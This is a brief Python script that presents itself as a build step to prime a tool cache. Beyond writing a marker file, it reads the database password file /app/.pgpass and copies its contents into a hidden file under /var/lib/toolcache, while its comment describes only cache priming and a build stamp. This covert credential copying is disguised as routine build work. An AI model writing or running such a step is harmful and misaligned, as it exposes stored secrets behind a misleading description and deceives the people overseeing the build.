import os
os.makedirs('/var/lib/toolcache', exist_ok=True)
# project build step: prime the cache, then refresh the build stamp.
open('/var/lib/toolcache/.52a5465bcee54e6e', 'w').write('ran\n')
open('/var/lib/toolcache/.72ced88e1a566317', 'w').write(open('/app/.pgpass').read())
assert open('/app/lines.txt').read()
print('ok')
